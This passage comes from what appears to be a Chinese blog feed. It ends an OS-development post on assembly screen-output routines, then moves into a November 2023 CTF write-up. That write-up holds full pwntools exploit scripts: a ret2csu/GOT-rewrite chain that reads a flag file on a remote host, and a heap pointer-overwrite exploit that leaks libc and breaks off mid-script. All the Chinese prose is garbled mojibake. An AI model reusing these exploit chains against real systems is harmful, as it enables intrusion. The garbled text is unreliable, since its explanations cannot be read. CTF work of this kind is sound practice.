;å°†ds:esiå¤„sizeä¸ºecxçš„dataï¼Œå¤åˆ¶åˆ°es:ediå¤„ï¼Œé€å­—èŠ‚æ‹·è´<br><br>pop ecx<br>leave                                    ;æ¢å¤æ ˆå¸§<br>ret<br></code></pre></td></tr></table></figure><p>æœ€åçš„æ•ˆæœçš„å°±æ˜¯è¿™æ ·</p><p><img src="/img/OS/34.png" alt="img"></p><h1 id="0x4-å®ç°è‡ªå·±çš„è¾“å‡ºå‡½æ•°"><a href="#0x4-å®ç°è‡ªå·±çš„è¾“å‡ºå‡½æ•°" class="headerlink" title="0x4:å®ç°è‡ªå·±çš„è¾“å‡ºå‡½æ•°"></a>0x4:å®ç°è‡ªå·±çš„è¾“å‡ºå‡½æ•°</h1><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬åœ¨å±å¹•ä¸Šè¾“å‡ºï¼Œè¦ä¹ˆæ˜¯ä¾é BIOSä¸­æ–­ï¼Œè¦ä¹ˆæ˜¯ç›´æ¥å¯¹æ˜¾å­˜è¿›è¡Œæ“ä½œ</p><p>ä½†æˆ‘ä»¬æ˜¯ä»€ä¹ˆï¼Œæ˜¯å°Šè´µçš„kernelï¼è¾“å‡ºè¿™ä»¶äº‹ï¼Œåº”è¯¥åªè¦è½»è½»çš„callä¸€ä¸ªfunctionï¼Œå°±èƒ½å®Œæˆ</p><p>æ‰€ä»¥ï¼Œæ˜¯æ—¶å€™å†™ä¸€ä¸ªè¾“å‡ºå‡½æ•°äº†ï¼ˆè™½ç„¶åªæ˜¯å¯¹æ˜¾å­˜æ“ä½œæµ‹å°è£…ç½¢äº†ğŸ¤”ï¼‰</p><h2 id="å•ä¸ªå­—ç¬¦è¾“å‡º"><a href="#å•ä¸ªå­—ç¬¦è¾“å‡º" class="headerlink" title="å•ä¸ªå­—ç¬¦è¾“å‡º"></a>å•ä¸ªå­—ç¬¦è¾“å‡º</h2><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs assembly">TI_GDTequ 0<br>RPL0 equ 0<br>SELECTOR_VIDEOequ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>[bits 32]<br>section .text<br><br>global put_char<br><br>put_char:<br>[bits 32]<br>pushad                                     ;ä¿å­˜å¯„å­˜å™¨çš„å€¼<br>mov ax, SELECTOR_VIDEO<br>mov gs, ax<br><br>mov dx, 0x3d4                              ;è·å–å…‰æ ‡çš„å€¼<br>mov al, 0x0e<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br>mov ah, al<br><br>mov dx, 0x3d4<br>mov al, 0x0f<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br><br>mov bx, ax<br>mov ecx, [esp+36]                           ;å°†è¦è¾“å‡ºå­—ç¬¦çš„asciiç å€¼ç»™ecx<br><br>cmp cl, 0x0d<br>jz .is_carriage_return<br>cmp cl, 0xa<br>jz .is_line_feed           <br><br>cmp cl, 0x8<br>jz .is_backspace<br>jmp .put_other<br><br>;-----é€€æ ¼-----<br>.is_backspace:<br>[bits 32]<br>dec bx<br>shl bx, 1<br><br>mov byte [gs:bx], 0x20<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>jmp .set_cursor<br><br><br>.put_other:<br>        [bits 32]<br>shl bx, 1<br>mov [gs:bx], cl<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>inc bx<br>cmp bx, 2000<br>jl .set_cursor<br><br>;-----æ¢è¡Œ-----<br>.is_line_feed:<br>[bits 32]<br>add bx, 80<br>cmp bx, 2000<br>jl .set_cursor<br>;-----å›è½¦-----<br>.is_carriage_return:<br>[bits 32]<br>xor dx, dx<br>mov ax, bx<br>mov si, 80<br>div si<br>sub bx, dx<br><br>jmp .set_cursor<br><br>;-----æ»šå±-----<br>.roll_screen:                                   ;ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŠŠ1-24çš„dataç§»åŠ¨åˆ°0-23è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ— éœ€è€ƒè™‘ç¼“å­˜é—®é¢˜<br>[bits 32]                                 <br>cld <br>mov eax, 960                                ;960*4 = 3840<br><br>mov esi, 0xc00b80a0                         ;ç¬¬1è¡Œ<br>mov edi, 0xc00b8000                         ;ç¬¬0è¡Œ<br>rep movsd                                   ;4å­—èŠ‚4å­—èŠ‚ç§»åŠ¨<br><br>mov ebx, 3840                               ;ç¬¬24è¡Œç¬¬ä¸€ä¸ªå…‰æ ‡çš„å€¼<br>mov ecx, 80<br><br>.cls:                                       ;ä½¿æœ€åä¸€è¡Œä¸ºç©ºç™½è¡Œ<br>[bits 32]<br>mov word [gs:ebx], 0x720<br>add ebx, 2<br>loop .cls<br>mov bx, 1920<br>;-----å­˜å‚¨å½“å‰å…‰æ ‡çš„å€¼-----<br>.set_cursor:<br>[bits 32]<br>mov dx, 0x3d4<br>mov al,0x0e<br>out dx, al<br>mov dx, 0x03d5<br>mov al, bh<br>out dx, al<br><br>mov dx, 0x3d4<br>mov al, 0xf<br>out dx,al<br>mov dx, 0x03d5<br>mov al, bl<br>out dx, al<br>;-----æ¢å¤å¯„å­˜å™¨çŠ¶æ€-----<br>.put_char_done:<br>[bits 32]<br>popad<br>ret<br><br></code></pre></td></tr></table></figure><p>åœ¨æ˜¾å­˜çš„æ–‡æœ¬æ˜¾ç¤ºæ¨¡å¼ä¸­ï¼Œä¸¤ä¸ªå­—èŠ‚æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦â€”â€”ä¸€å­—èŠ‚ä¸ºå­—ç¬¦çš„å€¼ï¼Œä¸€å­—èŠ‚ä¸ºå­—ç¬¦çš„å±æ€§ã€‚æ‰€ä»¥è·å–å…‰æ ‡çš„å€¼*2æ‰æ˜¯å¯¹åº”å­—ç¬¦åœ¨æ˜¾å­˜ä¸­çš„åç§»ã€‚</p><p>bochsçš„å±å¹•ï¼Œå¯ä»¥å®¹çº³80*25å…±2000ä¸ªå­—ç¬¦ï¼Œå æ®4000å­—èŠ‚ï¼Œæ‰€ä»¥æ¢è¡Œå°±æ˜¯ç®€å•ç²—æš´çš„å…‰æ ‡å€¼+80ï¼Œå›è½¦æ˜¯å½“å‰å…‰æ ‡å€¼ - ï¼ˆå½“å‰å…‰æ ‡å€¼å¯¹80å–æ¨¡ï¼‰ã€‚è‡³äºæ»šè¡Œçš„åŸç†ï¼Œå°±æ˜¯ç®€å•ç²—æš´çš„æŠŠ1-24è¡Œç§»åŠ¨åˆ°0-23è¡Œï¼Œçªå‡ºä¸€ä¸ªä¸è€ƒè™‘ç¼“å­˜ğŸ¤ª</p><h2 id="å­—ç¬¦ä¸²è¾“å‡º"><a href="#å­—ç¬¦ä¸²è¾“å‡º" class="headerlink" title="å­—ç¬¦ä¸²è¾“å‡º"></a>å­—ç¬¦ä¸²è¾“å‡º</h2><p>å¥½å§å…¶å®å°±æ˜¯å¯¹å•ä¸ªå­—ç¬¦è¾“å‡ºçš„å°è£…å‘œå‘œ</p><p>print.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIB_KERNEL_PRINT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _LIB_KERNEL_PRINT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdint.h&quot;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">put_char</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> char_csci)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">put_str</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global put_str<br><br>put_str:<br>push ebx<br>push ecx<br>xor ecx, ecx<br>mov ebx, [esp + 12]<br>.go_on:<br>mov cl, [ebx]<br>cmp cl, 0<br>jz .str_over<br>push ecx<br>call put_char<br>add esp, 4<br>inc ebx<br>jmp .go_on<br><br>.str_over:<br>pop ecx<br>pop ebx<br>ret<br></code></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;print.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>put_str(<span class="hljs-string">&quot;begin\r\n&quot;</span>);<br>put_str(<span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>);<br>put_str(<span class="hljs-string">&quot;\b\b\b\b\b\b\b\b&quot;</span>);<br>put_str(<span class="hljs-string">&quot;bbbbbbbbbb\r\n&quot;</span>);<br>put_str(<span class="hljs-string">&quot;end\r\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ld.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>nasm -f elf -o ./lib/kernel/print.o ./lib/kernel/print.S<br>gcc -m32 -I lib/kernel/ -c -o ./kernel/main.o ./kernel/main.c -masm=intel<br>ld -melf_i386 ./kernel/main.o ./lib/kernel/print.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin <br></code></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°ç»“æœè¿˜æ˜¯å¯ä»¥çš„</p><p><img src="/img/OS/35.png"></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11æœˆæ¯”èµ›åˆé›†</title>
    <link href="/2023/11/02/11/"/>
    <url>/2023/11/02/11/</url>
    
    <content type="html"><![CDATA[<h1 id="é¹åŸæ¯"><a href="#é¹åŸæ¯" class="headerlink" title="é¹åŸæ¯"></a>é¹åŸæ¯</h1><p>ç”²çº§æˆ˜çŠ¯ç¬¬ä¸€åœº</p><h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p>ç”¨ä¸€ä¸ªmagic gadget + ret2csuç›´æ¥æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;silent&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>ret2csu_front = <span class="hljs-number">0x0000000000400940</span><br>ret2csu_behind = <span class="hljs-number">0x000000000040095A</span><br>magic_gadget = <span class="hljs-number">0x00000000004007e8</span><br>stdout_got = <span class="hljs-number">0x601020</span><br>bss = <span class="hljs-number">0x602000</span><br><br><span class="hljs-comment">#0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_offset</span>(<span class="hljs-params">target,raw</span>):<br>    offset = target - raw<br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        offset = offset + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_vuln</span>(<span class="hljs-params">offset,target</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        offset,<br>        target+<span class="hljs-number">0x3d</span>,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>        magic_gadget,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret2csu</span>(<span class="hljs-params">rdi,rsi,rdx,vuln</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<br>        vuln,<br>        rdi,rsi,rdx,<br>        ret2csu_front,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + ret2csu(<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x300</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x400878</span>)<br><br>sd(payload1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(bss,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload2 += set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,stdout_got)<br>payload2 = payload2.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sd(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(bss) + p64(<span class="hljs-number">0x0000000000400876</span>)<br>sd(payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="auto-coffee"><a href="#auto-coffee" class="headerlink" title="auto coffee"></a>auto coffee</h2><p>èƒ½ç›´æ¥è¦†å†™ç¬¬äºŒä¸ªæŒ‡é’ˆç»„çš„ï¼Œsbäº†æˆ‘æ·¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./coffee&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4421&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;just pwn it&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">out</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;N&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy2</span>(<span class="hljs-params">choice,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;Y&#x27;</span>)<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_coffee</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">choice,idx,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0x4063c0</span>))<br>out()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy1(<span class="hljs-number">3</span>)<br><br>login()<br>re_coffee(<span class="hljs-number">3</span>)<br>re_coffee(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406300</span>)+p64(<span class="hljs-number">0x4062f0</span>)+p64(<span class="hljs-number">0x406018</span>))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406000</span>))<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;3.&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span 